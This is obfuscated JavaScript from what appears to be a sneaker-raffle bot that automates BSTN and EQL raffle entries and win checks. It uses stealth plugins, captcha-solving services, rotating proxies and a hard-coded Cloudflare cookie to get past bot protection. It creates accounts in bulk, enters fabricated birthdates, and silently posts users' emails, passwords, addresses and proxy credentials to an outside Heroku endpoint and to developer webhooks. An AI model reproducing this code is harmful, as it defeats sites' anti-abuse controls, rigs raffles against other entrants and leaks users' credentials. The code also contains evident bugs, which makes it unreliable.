                        var _0x2ec2f6 = Math['round'](Math['random']() * (_0x59eec6['length'] - 0x1)), _0x6797a7 = _0x59eec6[_0x2ec2f6]['split'](':'), _0x354176;
                        try {
                            _0x354176 = await _0x3d6bb6['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x6797a7[0x0] + ':' + _0x6797a7[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x354176 = await _0x3d6bb6['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x6797a7[0x0] + ':' + _0x6797a7[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x45364d = await _0x354176['newPage'](), _0x46dac2 = await _0x45364d['target']()['createCDPSession'](), { windowId: _0x52dcd8 } = await _0x46dac2['send']('Browser.getWindowForTarget');
                            await _0x45364d['setViewport']({
                                'width': 0x501,
                                'height': 0x2d0
                            });
                            var _0x347d5a = [{
                                'name': 'cf_clearance',
                                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                'domain': '.bstn.com',
                                'path': '/',
                                'expires': 1707818183.331533,
                                'httpOnly': !![],
                                'secure': !![]
                            }];
                            await _0x45364d['authenticate']({
                                'username': '' + _0x6797a7[0x2],
                                'password': '' + _0x6797a7[0x3]
                            }), console['log'](_0xb0c82c() + '\x20[' + _0x49fc69['name'] + ']\x20Task\x20' + (_0x3db934 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x45364d['goto']('' + _0x2a8ccb[_0x3db934]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0xb0c82c() + '\x20[' + _0x49fc69['name'] + ']\x20Task\x20' + (_0x3db934 + 0x1) + '\x20:\x20Solving\x20Cloudflare');
                            var _0x5459f1 = await _0x45364d['$']('.hcaptcha-box');
                            if (_0x5459f1) {
                                console['log'](_0xb0c82c() + '\x20[' + _0x49fc69['name'] + ']\x20Task\x20' + (_0x3db934 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x32344d(0x2710);
                                const _0x1ad1e6 = await _0x45364d['$']('.hcaptcha-box');
                                if (_0x1ad1e6)
                                    try {
                                        await _0x1ad1e6['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x45364d['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x20c969 = await _0x45364d['$']('.hcaptcha-box');
                                    if (_0x20c969)
                                        try {
                                            await _0x20c969['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            try {
                                await _0x45364d['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                            } catch {
                                throw new Error('Blocked\x20by\x20Cloudflare');
                            }
                            await _0x46dac2['send']('Browser.setWindowBounds', {
                                'windowId': _0x52dcd8,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x32344d(0x1388), await _0x45364d['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x45364d['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x32344d(0x1f4), console['log'](_0xb0c82c() + '\x20[' + _0x49fc69['name'] + ']\x20Task\x20' + (_0x3db934 + 0x1) + '\x20:\x20Logging\x20in'), await _0x45364d['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x5c88d8 => _0x5c88d8['click']()), await _0x45364d['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x45364d['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x32344d(0x7d0), await _0x45364d['waitForSelector']('#email-login'), await _0x45364d['type']('#email-login', '' + _0x2a8ccb[_0x3db934]['Email']), await _0x32344d(0xdac), await _0x45364d['waitForSelector']('#password'), await _0x45364d['type']('#password', '' + _0x2a8ccb[_0x3db934]['Password'], { 'delay': 0xe6 }), await _0x32344d(0x157c);
                            try {
                                await _0x45364d['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x4f3895 => _0x4f3895['click']());
                            } catch {
                            }
                            try {
                                await _0x45364d['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                            } catch (_0x5c5267) {
                            }
                            await _0x32344d(0x3e8);
                            const _0x15fdf2 = await _0x45364d['$']('.enteredDraw_container__2KmQ_');
                            if (_0x15fdf2)
                                throw new Error('Duplicate\x20Entry');
                            console['log'](_0xb0c82c() + '\x20[' + _0x49fc69['name'] + ']\x20Task\x20' + (_0x3db934 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x2a8ccb[_0x3db934]['Size']);
                            try {
                                if (_0x2a8ccb[_0x3db934]['Size'] != 'RANDOM') {
                                    var _0x197861 = _0x2a8ccb[_0x3db934]['Size']['replace']('.', ',');
                                    const _0x4235f7 = await _0x45364d['$x']('//div[contains(text(),\x20' + _0x197861 + ')]');
                                    await _0x4235f7[0x0]['click']();
                                } else {
                                    const _0x225b0f = await _0x45364d['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x4ec3d3 = Math['round'](Math['random']() * (_0x225b0f['length'] - 0x1));
                                    await _0x225b0f[_0x4ec3d3]['click']();
                                }
                            } catch {
                                throw new Error('Softblocked,\x20Rotating\x20proxy');
                            }
                            await _0x32344d(0x1f4);
                            const _0x16aa20 = await _0x45364d['$']('.addressList_addressItem__LE2PB');
                            if (_0x16aa20 && _0x2a8ccb[_0x3db934]['Mode'] != 'NEW') {
                            } else
                                console['log'](_0xb0c82c() + '\x20[' + _0x49fc69['name'] + ']\x20Task\x20' + (_0x3db934 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x45364d['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x32344d(0x5dc), await _0x45364d['waitForSelector']('#firstname'), await _0x45364d['type']('#firstname', '' + _0x2a8ccb[_0x3db934]['FirstName']), await _0x32344d(0x1f4), await _0x45364d['waitForSelector']('#firstname'), await _0x45364d['type']('#lastname', '' + _0x2a8ccb[_0x3db934]['LastName']), await _0x32344d(0x1f4), await _0x45364d['waitForSelector']('#firstname'), await _0x45364d['type']('#street', '' + _0x2a8ccb[_0x3db934]['Address1']), await _0x32344d(0x1f4), await _0x45364d['waitForSelector']('#firstname'), await _0x45364d['type']('#houseNumber', _0x2a8ccb[_0x3db934]['HouseNumber'] + '\x20' + _0x2a8ccb[_0x3db934]['Address2']), await _0x32344d(0x1f4), await _0x45364d['waitForSelector']('#firstname'), await _0x45364d['select']('#country_code', '' + _0x2a8ccb[_0x3db934]['Country']), await _0x32344d(0x1f4), await _0x45364d['type']('#postcode', '' + _0x2a8ccb[_0x3db934]['Zip']), await _0x32344d(0x1f4), await _0x45364d['type']('#city', '' + _0x2a8ccb[_0x3db934]['City']), await _0x32344d(0x1f4), await _0x45364d['type']('#telephone', '' + _0x2a8ccb[_0x3db934]['Phone']), await _0x32344d(0x1f4), await _0x45364d['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                            await _0x32344d(0x9c4);
                            try {
                                await _0x45364d['type']('#instagram_name', '' + _0x2a8ccb[_0x3db934]['Follower']), await _0x45364d['click']('.note_groupBtn__WLDwH\x20>\x20button');
                            } catch {
                            }
                            console['log'](_0xb0c82c() + '\x20[' + _0x49fc69['name'] + ']\x20Task\x20' + (_0x3db934 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x32344d(0x5dc);
                            try {
                                await _0x45364d['click']('.checkBox_boxHolder__wLGVe');
                            } catch {
                            }
                            await _0x32344d(0x5dc), await _0x45364d['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0xed4b42 => _0xed4b42['click']()), await _0x32344d(0x1388);
                            try {
                                await _0x45364d['waitForSelector']('.success_msg__2HjJY');
                            } catch {
                                await _0x45364d['reload']({ 'waitUntil': 'networkidle2' });
                                if (_0x2a8ccb[_0x3db934]['Size'] != 'RANDOM') {
                                    var _0x197861 = _0x2a8ccb[_0x3db934]['Size']['replace']('.', ',');
                                    const _0x302727 = await _0x45364d['$x']('//div[contains(text(),\x20' + _0x197861 + ')]');
                                    await _0x302727[0x0]['click']();
                                } else {
                                    const _0x4ba4b9 = await _0x45364d['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x4ec3d3 = Math['round'](Math['random']() * (_0x4ba4b9['length'] - 0x1));
                                    await _0x4ba4b9[_0x4ec3d3]['click']();
                                }
                                await _0x32344d(0x5dc);
                                try {
                                    await _0x45364d['hover']('#instagram_name'), await _0x45364d['type']('#instagram_name', '' + _0x2a8ccb[_0x3db934]['Follower']), await _0x45364d['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0xb0c82c() + '\x20[' + _0x49fc69['name'] + ']\x20Task\x20' + (_0x3db934 + 0x1) + '\x20:\x20Retrying\x20(' + _0x43ec14 + '\x20/\x205)');
                                try {
                                    await _0x45364d['hover']('.checkBox_boxHolder__wLGVe'), await _0x32344d(0x5dc), await _0x45364d['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0x32344d(0x157c), await _0x45364d['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x332a58 => _0x332a58['click']()), await _0x32344d(0x1388), await _0x45364d['waitForSelector']('.success_msg__2HjJY');
                            }
                            _0x227a95 = 'no', _0x5677a4(_0x2a8ccb[_0x3db934], _0x49fc69);
                            try {
                                prxdata = {
                                    'username': _0x4b3861['replace']('#', ''),
                                    'entrydata': JSON['stringify'](_0x386667),
                                    'proxy': '' + _0x59eec6[_0x3db934]
                                };
                                var _0x33d4b3 = JSON['stringify'](prxdata);
                                let _0x24bba4 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3c1aeb['post']('https://jraffles.herokuapp.com/success', _0x33d4b3, _0x24bba4);
                            } catch (_0x4b88ae) {
                            }
                            console['log'](_0x5b4136['green'](_0xb0c82c() + '\x20[' + _0x49fc69['name'] + ']\x20Task\x20' + (_0x3db934 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            var _0x2f0ecc = await _0xe56989(_0x2a8ccb[_0x3db934], _0x49fc69, 'dev', ![]), _0x1747a5 = await _0xe56989(_0x2a8ccb[_0x3db934], _0x49fc69, 'pub', ![]);
                            const _0x2a3b97 = {
                                'succesDEVMSG': { 'embeds': [_0x2f0ecc] },
                                'succesPUBMSG': { 'embeds': [_0x1747a5] }
                            };
                            let _0x386667 = _0x2a8ccb[_0x3db934];
                            try {
                                prxdata = {
                                    'username': _0x4b3861['replace']('#', ''),
                                    'module': _0x49fc69['name'],
                                    'entrydata': JSON['stringify'](_0x386667),
                                    'proxy': '' + _0x59eec6[_0x3db934]
                                };
                                var _0x33d4b3 = JSON['stringify'](prxdata);
                                let _0x30533a = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3c1aeb['post']('https://jraffles.herokuapp.com/success', _0x33d4b3, _0x30533a);
                            } catch (_0x389a66) {
                            }
                            try {
                                _0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '' && await _0x16e110(_0x8aa917['webhook'], _0x2a3b97['succesDEVMSG']), await _0x32344d(0xc8), await _0x16e110(_0x275f2a, _0x2a3b97['succesDEVMSG']), await _0x32344d(0xc8), await _0x16e110(_0x583375, _0x2a3b97['succesPUBMSG']);
                            } catch (_0x570a8e) {
                                console['log'](_0x5b4136['yellow'](_0xb0c82c() + '\x20[' + _0x49fc69['name'] + ']\x20Task\x20' + (_0x3db934 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x570a8e));
                            }
                        } catch (_0x5a88c6) {
                            console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x49fc69['name'] + ']\x20Task\x20' + (_0x3db934 + 0x1) + '\x20:\x20' + _0x5a88c6)), _0x227a95 = 'yes', _0x437ff5 = '' + _0x5a88c6;
                            var _0x3cbbac = await _0xe56989(_0x2a8ccb[_0x3db934], _0x49fc69, 'dev', !![], _0x437ff5), _0x2f0ecc = await _0xe56989(_0x2a8ccb[_0x3db934], _0x49fc69, 'dev', ![]), _0x1747a5 = await _0xe56989(_0x2a8ccb[_0x3db934], _0x49fc69, 'pub', ![]);
                            const _0x2c0561 = {
                                'succesDEVMSG': { 'embeds': [_0x2f0ecc] },
                                'succesPUBMSG': { 'embeds': [_0x1747a5] }
                            };
                            _0x2c0561['errorDEV'] = { 'embeds': [_0x3cbbac] }, _0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '' && await _0x16e110(_0x8aa917['webhook'], _0x2c0561['errorDEV']), await _0x16e110(_0x3ba800, _0x2c0561['errorDEV']);
                        } finally {
                            _0x354176['close']();
                            if (_0x227a95 == 'yes' && _0x43ec14 != 0x5) {
                                console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x49fc69['name'] + ']\x20Task\x20' + (_0x3db934 + 0x1) + '\x20:\x20Retrying\x20(' + _0x43ec14 + '\x20/\x205)')), _0x3db934 = _0x3db934 - 0x1, _0x43ec14 = _0x43ec14 + 0x1;
                                continue;
                            }
                            _0x227a95 == 'yes' && _0x43ec14 >= 0x5 && (_0x4af7c0(_0x2a8ccb[_0x3db934], _0x49fc69), _0x227a95 = 'no', _0x43ec14 = 0x0), console['log'](_0xb0c82c() + '\x20[' + _0x49fc69['name'] + ']\x20Waiting\x20for\x20' + _0x8aa917['delay'] + '\x20ms'), await _0x32344d(_0x8aa917['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x12ec74, _0x2d4d4b) {
                    _0x3d6bb6['use'](_0x922449()), _0x3d6bb6['use'](_0x4b9689({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x8aa917['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    var _0xdd7fe8;
                    try {
                        const _0x4bf6b3 = _0x4fe38c['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0xdd7fe8 = _0x1d9836['parse'](_0x4bf6b3, { 'header': !![] })['data'];
                    } catch (_0x111261) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0x22358c = 0x0; _0x22358c < _0xdd7fe8['length']; _0x22358c++) {
                        if (_0x5e2c21 != 'yes')
                            var _0x5e2c21 = '', _0x2ecf4e = 0x0;
                        var _0x3022f8;
                        _0x299f70(_0x12ec74['name'] + '\x20Task\x20' + (_0x22358c + 0x1) + '\x20/\x20' + _0xdd7fe8['length'] + '\x20||\x20File:\x20' + _0x1901f8 + '\x20Proxies:\x20' + _0x504c2d);
                        var _0x4b951f = await _0xe56989(_0xdd7fe8[_0x22358c], _0x12ec74, 'acc', ![]);
                        const _0x485c8a = { 'succesDEVMSG': { 'embeds': [_0x4b951f] } }, _0x58dc78 = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x43be2a = Math['round'](Math['random']() * (_0x2d4d4b['length'] - 0x1)), _0x8f9ee4 = _0x2d4d4b[_0x43be2a]['split'](':'), _0x349d4d;
                        try {
                            _0x349d4d = await _0x3d6bb6['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x8f9ee4[0x0] + ':' + _0x8f9ee4[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x349d4d = await _0x3d6bb6['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x8f9ee4[0x0] + ':' + _0x8f9ee4[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5ec36a = await _0x349d4d['newPage']();
                            await _0x5ec36a['authenticate']({
                                'username': '' + _0x8f9ee4[0x2],
                                'password': '' + _0x8f9ee4[0x3]
                            }), console['log'](_0xb0c82c() + '\x20[' + _0x12ec74['name'] + ']\x20Task\x20' + (_0x22358c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5ec36a['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x5ec36a['setRequestInterception'](!![]), _0x5ec36a['on']('request', _0x454cdf => {
                                _0x454cdf['resourceType']() === 'image' ? _0x454cdf['abort']() : _0x454cdf['continue']();
                            });
                            try {
                                await _0x5ec36a['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x5ec36a['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                            } catch {
                                _0x5e2c21 = 'yes';
                                throw new Error('Connection\x20Error');
                            }
                            await _0x5ec36a['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0xb0c82c() + '\x20[' + _0x12ec74['name'] + ']\x20Task\x20' + (_0x22358c + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x32344d(0x3e8), await _0x5ec36a['type']('#email', _0xdd7fe8[_0x22358c]['Email']), await _0x32344d(0x1f4), await _0x5ec36a['type']('#pass', _0xdd7fe8[_0x22358c]['Password']), await _0x32344d(0x1f4), await _0x5ec36a['$eval']('#login-form', _0x3ab652 => _0x3ab652['submit']());
                            try {
                                await _0x5ec36a['waitForSelector']('.product-items');
                            } catch {
                                console['log'](_0xb0c82c() + '\x20[' + _0x12ec74['name'] + ']\x20Task\x20' + (_0x22358c + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                continue;
                            }
                            await _0x32344d(0x190);
                            const _0x4c9f46 = await _0x5ec36a['evaluate'](() => {
                                const _0x3d635f = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                return _0x3d635f['map'](_0x4d44a5 => _0x4d44a5['alt']);
                            }), _0x35f0a5 = await _0x5ec36a['evaluate'](() => {
                                const _0xde3027 = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                return _0xde3027['map'](_0x21d963 => _0x21d963['innerHTML']);
                            }), _0x4dfb02 = await _0x5ec36a['$$']('.raffle-winner');
                            if (_0x4dfb02['length'] < 0x1) {
                                console['log'](_0xb0c82c() + '\x20[' + _0x12ec74['name'] + ']\x20Task\x20' + (_0x22358c + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x5e2c21 = 'no';
                                continue;
                            }
                            console['log'](_0xb0c82c() + '\x20[' + _0x12ec74['name'] + ']\x20Task\x20' + (_0x22358c + 0x1) + '\x20:\x20' + _0x4dfb02['length'] + '\x20Wins\x20Found!');
                            for (var _0x471ee2 = 0x0; _0x471ee2 < _0x4dfb02['length']; _0x471ee2++) {
                                console['log'](_0x5b4136['green'](_0x4c9f46[_0x471ee2] + _0x35f0a5[_0x471ee2]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                            }
                        } catch (_0x1fc5c1) {
                            console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x12ec74['name'] + ']\x20Task\x20' + (_0x22358c + 0x1) + '\x20:\x20' + _0x1fc5c1)), _0x3022f8 = '' + _0x1fc5c1;
                            var _0x823b15 = await _0xe56989(_0xdd7fe8[_0x22358c], _0x12ec74, 'acc', !![], _0x3022f8);
                            _0x485c8a['errorDEV'] = { 'embeds': [_0x823b15] }, _0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '' && await _0x16e110(_0x8aa917['webhook'], _0x485c8a['errorDEV']), await _0x16e110(_0x3ba800, _0x485c8a['errorDEV']), _0x5e2c21 = 'yes';
                        } finally {
                            if (_0x349d4d)
                                _0x349d4d['close']();
                            if (_0x5e2c21 == 'yes' && _0x2ecf4e != 0x5) {
                                console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x12ec74['name'] + ']\x20Task\x20' + (_0x22358c + 0x1) + '\x20:\x20Retrying\x20(' + _0x2ecf4e + '\x20/\x205)')), _0x22358c = _0x22358c - 0x1, _0x2ecf4e = _0x2ecf4e + 0x1;
                                continue;
                            }
                            _0x5e2c21 == 'yes' && _0x2ecf4e >= 0x5 && (_0x4af7c0(_0xdd7fe8[_0x22358c], _0x12ec74), _0x5e2c21 = 'no', _0x2ecf4e = 0x0), console['log'](_0xb0c82c() + '\x20[' + _0x12ec74['name'] + ']\x20Waiting\x20for\x20' + _0x8aa917['delay'] + '\x20ms'), await _0x32344d(_0x8aa917['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0x1a09bb, _0x546f00, _0x568bf8) {
                _0x3d6bb6['use'](_0x922449()), _0x3d6bb6['use'](_0x4b9689({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x8aa917['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x49e510 = 0x0; _0x49e510 < _0x546f00['length']; _0x49e510++) {
                    var _0x27d311;
                    _0x299f70(_0x1a09bb['name'] + '\x20Task\x20' + (_0x49e510 + 0x1) + '\x20/\x20' + _0x546f00['length'] + '\x20||\x20File:\x20' + _0x1901f8 + '\x20Proxies:\x20' + _0x504c2d);
                    try {
                        await _0x4669df(_0x546f00, _0x49e510);
                    } catch {
                        _0x144472 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x4c315b(_0x2ad923) {
                        const _0xbae57 = _0x4fe38c['readFileSync']('../successful-tasks.csv', 'utf8'), _0x44b50a = _0x1d9836['parse'](_0xbae57, { 'header': !![] })['data'];
                        let _0x107701 = ![];
                        for (var _0x56931f of _0x44b50a) {
                            if (_0x56931f['Url'] == _0x2ad923['Url'] && _0x56931f['Email'] == _0x2ad923['Email']) {
                                _0x107701 = !![];
                                break;
                            }
                        }
                        return _0x107701;
                    }
                    if (await _0x4c315b(_0x546f00[_0x49e510]) == !![]) {
                        console['log'](_0xb0c82c() + '\x20[' + _0x1a09bb['name'] + ']\x20Task\x20' + (_0x49e510 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x1d96d7 = ![];
                    const _0x5ea060 = _0x4fe38c['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0x2fe6fa = _0x1d9836['parse'](_0x5ea060, { 'header': !![] })['data'];
                    for (var _0xabf475 of _0x2fe6fa) {
                        _0xabf475['Email'] == _0x546f00[_0x49e510]['Email'] && (_0x1d96d7 = !![]);
                    }
                    if (_0x1d96d7 == ![]) {
                        var _0x29740f;
                        if (_0x546f00[_0x49e510]['Url']['endsWith']('/')) {
                            _0x29740f = _0x546f00[_0x49e510]['Url'] + 'register';
                            if (_0x144472 != 'yes')
                                var _0x144472 = '', _0xe9258c = 0x0;
                        } else {
                            _0x29740f = _0x546f00[_0x49e510]['Url'] + '/register';
                            if (_0x144472 != 'yes')
                                var _0x144472 = '', _0xe9258c = 0x0;
                        }
                        if (_0x546f00[_0x49e510]['Email'] == '' || _0x546f00[_0x49e510]['FirstName'] == '' || _0x546f00[_0x49e510]['LastName'] == '') {
                            console['log'](_0xb0c82c() + '\x20[' + _0x1a09bb['name'] + ']\x20Task\x20' + (_0x49e510 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x546f00[_0x49e510]['Password'] == '' && (_0x546f00[_0x49e510]['Password'] = 'JRaffles23!');
                        if (_0x8aa917['useRandomProxy'] = ![])
                            var _0x197ff2 = _0x568bf8[_0x49e510]['split'](':');
                        else
                            var _0xfbf598 = Math['round'](Math['random']() * (_0x568bf8['length'] - 0x1)), _0x197ff2 = _0x568bf8[_0xfbf598]['split'](':');
                        var _0x1f5b01;
                        try {
                            _0x1f5b01 = await _0x3d6bb6['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x197ff2[0x0] + ':' + _0x197ff2[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1f5b01 = await _0x3d6bb6['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x197ff2[0x0] + ':' + _0x197ff2[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x52615e = await _0x1f5b01['newPage']();
                            await _0x52615e['authenticate']({
                                'username': '' + _0x197ff2[0x2],
                                'password': '' + _0x197ff2[0x3]
                            }), console['log'](_0xb0c82c() + '\x20[' + _0x1a09bb['name'] + ']\x20Task\x20' + (_0x49e510 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x52615e['setRequestInterception'](!![]), _0x52615e['on']('request', _0x7d4f73 => {
                                _0x7d4f73['resourceType']() === 'image' || _0x7d4f73['resourceType']() === 'font' || _0x7d4f73['resourceType']() === 'media' ? _0x7d4f73['abort']() : _0x7d4f73['continue']();
                            });
                            try {
                                await _0x52615e['goto'](_0x29740f);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0xb0c82c() + '\x20[' + _0x1a09bb['name'] + ']\x20Task\x20' + (_0x49e510 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x32344d(0x3e8), await _0x52615e['waitForSelector']('#email'), await _0x52615e['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x32344d(0x3e8);
                            try {
                                await _0x52615e['click']('li[data-value=\x22EU\x20' + _0x546f00[_0x49e510]['Size'] + '\x22]');
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x546f00[_0x49e510]['Size']);
                            }
                            await _0x32344d(0x6a4), await _0x52615e['type']('#email', '' + _0x546f00[_0x49e510]['Email']), await _0x32344d(0x352), await _0x52615e['waitForSelector']('#password'), await _0x52615e['type']('#password', '' + _0x546f00[_0x49e510]['Password']), await _0x32344d(0x352), await _0x52615e['type']('#phone', '' + _0x546f00[_0x49e510]['Phone']), await _0x32344d(0x352), await _0x52615e['type']('#firstName', '' + _0x546f00[_0x49e510]['FirstName']), await _0x32344d(0x352), await _0x52615e['type']('#lastName', '' + _0x546f00[_0x49e510]['LastName']), await _0x32344d(0x352);
                            _0x546f00[_0x49e510]['Url']['includes']('footlocker.de') ? await _0x52615e['type']('#birthdate', _0x4f2c19(0x1, 0x1c) + '.' + _0x4f2c19(0x1, 0xc) + '.' + _0x4f2c19(0x7c6, 0x7d3)) : await _0x52615e['type']('#birthdate', _0x4f2c19(0x1, 0x1c) + '-' + _0x4f2c19(0x1, 0xc) + '-' + _0x4f2c19(0x7c6, 0x7d3));
                            await _0x32344d(0x352), await _0x52615e['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                await _0x52615e['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0x32344d(0x1f4), await _0x52615e['click']('#stateAutocomplete'), console['log'](_0xb0c82c() + '\x20[' + _0x1a09bb['name'] + ']\x20Task\x20' + (_0x49e510 + 0x1) + '\x20:\x20Setting\x20Address'), await _0x32344d(0x1f4);
                            try {
                                const _0x468383 = await _0x52615e['$x']('//li[text()=\x22' + _0x546f00[_0x49e510]['State'] + '\x22]');
                                await _0x468383[0x0]['click']();
                            } catch {
                                throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                            }
